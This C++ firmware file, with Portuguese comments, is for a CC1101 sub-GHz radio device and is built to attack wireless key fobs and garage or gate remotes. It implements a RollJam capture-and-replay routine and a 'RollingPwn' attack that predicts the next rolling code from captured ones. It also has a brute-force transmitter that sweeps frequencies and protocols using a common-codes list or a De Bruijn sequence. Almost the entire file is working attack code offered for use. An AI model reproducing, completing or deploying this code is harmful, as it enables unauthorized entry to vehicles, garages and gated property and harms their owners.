#include "config.h"

// Variaveis globais
bool rolljamActive = false;
uint32_t rolljamCode1 = 0;
uint32_t rolljamCode2 = 0;
bool rolljamHasCode1 = false;
bool rolljamHasCode2 = false;
int rolljamStep = 0;
unsigned long rolljamTimer = 0;
int rolljamProtocol1 = 0;
int rolljamProtocol2 = 0;
int rolljamBits1 = 0;
int rolljamBits2 = 0;
bool rollingPwnActive = false;
int rollingPwnStep = 0;
int rollingPwnCounter = 0;
unsigned long rollingPwnTimer = 0;
uint32_t capturedCodes[10];
int capturedCodeCount = 0;
int capturedProtocols[10];
int capturedBits[10];
int32_t rollingPwnPattern = 0;
int rollingPwnPatternType = 0;
BFMode bfMode = BF_MODE_COMMON;
BFState bfState = BF_IDLE;
int bfFreqIndex = 0;
int bfProtocolIndex = 0;
uint32_t bfCode = 0;
unsigned long bfStartTime = 0;
int bfCodesSent = 0;

// Variaveis para RollJam com jamming
namespace {
  bool rolljamJamming = false;
  unsigned long rolljamJamTimer = 0;
  uint32_t rolljamTargetFreq = 0;
  uint32_t* deBruijnBuffer = nullptr;
  int deBruijnSize = 0;
  int deBruijnIndex = 0;
}

void rollJamAttackStep() {
  if (!rolljamActive) return;

  unsigned long now = millis();
  switch (rolljamStep) {
    case 0:
      if (rolljamHasCode1 && rolljamHasCode2) {
        Serial.println("[RollJam] Reproduzindo codigo 1...");
        transmitCode(rolljamCode1, rolljamBits1, protocols[rolljamProtocol1]);
        rolljamTimer = now;
        rolljamStep = 1;
      }
      break;
    case 1:
      if (now - rolljamTimer > 2000) {
        Serial.println("[RollJam] Reproduzindo codigo 2...");
        transmitCode(rolljamCode2, rolljamBits2, protocols[rolljamProtocol2]);
        rolljamTimer = now;
        rolljamStep = 2;
      }
      break;
    case 2:
      if (now - rolljamTimer > 2000) {
        Serial.println("[RollJam] Resetando...");
        rolljamStep = 0;
      }
      break;
  }
}

void rollJamAttackWithJamming() {
  if (!rolljamActive) return;

  unsigned long now = millis();

  if (rolljamStep == 0) {
    if (!rolljamHasCode1) {
      if (getCCState() != CC_CAPTURING) {
        startCapture(rolljamTargetFreq);
      }
      captureStep();

      if (getCaptureIndex() > 20) {
        stopCapture();
        DecodedSignal decoded = decodeCapturedSignal();
        if (decoded.valid) {
          rolljamCode1 = decoded.code;
          rolljamProtocol1 = decoded.protocolIndex;
          rolljamBits1 = decoded.bits;
          rolljamHasCode1 = true;
          Serial.printf("[RollJam] Codigo 1 capturado: 0x%08X\n", rolljamCode1);
        }
      }
    }

    if (rolljamHasCode1 && !rolljamHasCode2) {
      if (getCCState() != CC_CAPTURING) {
        startCapture(rolljamTargetFreq);
      }
      captureStep();

      if (getCaptureIndex() > 20) {
        stopCapture();
        DecodedSignal decoded = decodeCapturedSignal();
        if (decoded.valid && decoded.code != rolljamCode1) {
          rolljamCode2 = decoded.code;
          rolljamProtocol2 = decoded.protocolIndex;
          rolljamBits2 = decoded.bits;
          rolljamHasCode2 = true;
          Serial.printf("[RollJam] Codigo 2 capturado: 0x%08X\n", rolljamCode2);
          rolljamTimer = now;
          rolljamStep = 1;
        }
      }
    }
  }

  rollJamAttackStep();
}

void rollingPwnAttackStep() {
  if (!rollingPwnActive) return;

  unsigned long now = millis();
  if (now - rollingPwnTimer < 100) return;
  rollingPwnTimer = now;

  if (capturedCodeCount < 2) {
    Serial.println("[RollingPwn] Aguardando mais codigos...");
    return;
  }

  uint32_t predicted = capturedCodes[capturedCodeCount - 1] + rollingPwnPattern;
  Serial.printf("[RollingPwn] Predicao: 0x%08X\n", predicted);
  transmitCode(predicted, capturedBits[0], protocols[capturedProtocols[0]]);
  rollingPwnCounter++;
}

// ==========================================
// Setup De Bruijn
// ==========================================
void initDeBruijn(int windowSize) {
  if (deBruijnBuffer) {
    free(deBruijnBuffer);
    deBruijnBuffer = nullptr;
  }

  deBruijnSize = getDeBruijnLength(2, windowSize);
  deBruijnBuffer = (uint32_t*)malloc(deBruijnSize * sizeof(uint32_t));
  if (!deBruijnBuffer) {
    Serial.println("[DeBruijn] Falha ao alocar buffer");
    deBruijnSize = 0;
    return;
  }

  generateDeBruijnSequence(2, windowSize, deBruijnBuffer, deBruijnSize);
  deBruijnIndex = 0;
  Serial.printf("[DeBruijn] Sequencia gerada: %d bits\n", deBruijnSize);
}

void cc1101BruteForceSetup() {
  // CORRECAO CRITICA: NUNCA reinicializar SPI aqui!
  // Isso corrompe o barramento compartilhado com o CC1101
  // O SPI ja foi inicializado em setupHardware()
  
  bfState = BF_IDLE;
  bfFreqIndex = 0;
  bfProtocolIndex = 0;
  bfCode = 0;
  bfCodesSent = 0;
  bfStartTime = 0;

  if (bfMode == BF_MODE_DEBRUIJN) {
    initDeBruijn(12);
  }

  Serial.println("[BruteForce] Configurado. SEL para iniciar");
}

void cc1101BruteForceLoop() {

  if (buttonPressed(BTN_BACK)) {
    bfState = BF_IDLE;
    ELECHOUSE_cc1101.setSidle();
    current_screen = 0;
    drawMenu();
    delay(200);
    return;
  }

  if (buttonPressed(BTN_SELECT) && bfState == BF_IDLE) {
    bfState = BF_RUNNING;
    bfStartTime = millis();
    bfCodesSent = 0;
    Serial.println("[BruteForce] Iniciando...");
    delay(200);
  }

  if (buttonPressed(BTN_SELECT) && bfState == BF_RUNNING) {
    bfState = BF_PAUSED;
    Serial.println("[BruteForce] Pausado");
    delay(200);
  } else if (buttonPressed(BTN_SELECT) && bfState == BF_PAUSED) {
    bfState = BF_RUNNING;
    Serial.println("[BruteForce] Retomando");
    delay(200);
  }

  u8g2.clearBuffer();
  drawFunctionHeader("CC1101 BruteForce");
  u8g2.setFont(u8g2_font_6x10_tr);
  u8g2.setCursor(0, 28);

  if (bfState == BF_IDLE) {
    u8g2.print("SEL: Iniciar");
    u8g2.setCursor(0, 40);
    if (bfMode == BF_MODE_DEBRUIJN) u8g2.print("Modo: De Bruijn");
    else if (bfMode == BF_MODE_COMMON) u8g2.print("Modo: Common Codes");
    else u8g2.print("Modo: Full");
  } else if (bfState == BF_RUNNING) {
    u8g2.print("Enviando...");
    u8g2.setCursor(0, 40);
    u8g2.print("Freq: ");
    u8g2.print(BRUTE_FREQS[bfFreqIndex] / 1000.0);
    u8g2.setCursor(0, 52);
    u8g2.print("Codes: ");
    u8g2.print(bfCodesSent);
  } else {
    u8g2.print("PAUSADO");
    u8g2.setCursor(0, 40);
    u8g2.print("Codes: ");
    u8g2.print(bfCodesSent);
  }
  u8g2.sendBuffer();

  if (bfState == BF_RUNNING) {
    if (bfFreqIndex < NUM_BRUTE_FREQS) {
      ELECHOUSE_cc1101.setMHZ(BRUTE_FREQS[bfFreqIndex] / 1000.0);
      ELECHOUSE_cc1101.SetTx();
      // CORRECAO: NAO chamar cc1101SetMaxPower() no loop — corrompe o chip
      // A potencia ja foi configurada no setup

      if (bfMode == BF_MODE_DEBRUIJN && deBruijnBuffer) {
        for (int i = 0; i < 50 && deBruijnIndex < deBruijnSize; i++) {
          uint32_t code = 0;
          for (int b = 0; b < 24 && (deBruijnIndex + b) < deBruijnSize; b++) {
            code = (code << 1) | deBruijnBuffer[deBruijnIndex + b];
          }
          transmitCode(code, 24, protocols[bfProtocolIndex % NUM_PROTOCOLS]);
          bfCodesSent++;
          deBruijnIndex++;
          delayMicroseconds(500);
        }

        if (deBruijnIndex >= deBruijnSize) {
          deBruijnIndex = 0;
          bfProtocolIndex++;
          if (bfProtocolIndex >= NUM_PROTOCOLS) {
            bfProtocolIndex = 0;
            bfFreqIndex++;
          }
        }
      } else {
        for (int i = 0; i < 20 && bfCode < NUM_COMMON_CODES; i++) {
          transmitCode(COMMON_CODES[bfCode], 24, protocols[bfProtocolIndex % NUM_PROTOCOLS]);
          bfCodesSent++;
          bfCode++;
          delayMicroseconds(500);
        }

        if (bfCode >= NUM_COMMON_CODES) {
          bfCode = 0;
          bfProtocolIndex++;
          if (bfProtocolIndex >= NUM_PROTOCOLS) {
            bfProtocolIndex = 0;
            bfFreqIndex++;
          }
        }
      }

      if (bfFreqIndex >= NUM_BRUTE_FREQS) {
        bfState = BF_IDLE;
        Serial.println("[BruteForce] Concluido!");
      }
    }
  }
}
